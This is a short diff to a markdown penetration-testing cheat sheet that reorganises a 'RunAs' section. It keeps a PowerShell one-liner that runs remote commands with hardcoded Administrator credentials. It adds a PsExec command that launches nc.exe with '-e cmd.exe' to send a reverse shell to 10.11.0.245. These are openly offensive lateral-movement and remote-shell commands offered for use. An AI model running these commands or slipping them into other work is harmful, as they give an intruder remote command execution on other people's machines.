@@ -358,9 +358,15 @@ htc -F 8080 192.168.1.15:80
 ssh localhost -p 8080
 ```
 
-#### RunAs / Start Process As: Powershell
+#### RunAs / Start Process As
+##### PowerShell
 ```powershell
+# Requires PSRemoting
 $username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami } 
+```
+##### PsExec
+```bash
+psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
 ```
 
 #### Recursively Find Hidden Files: Windows
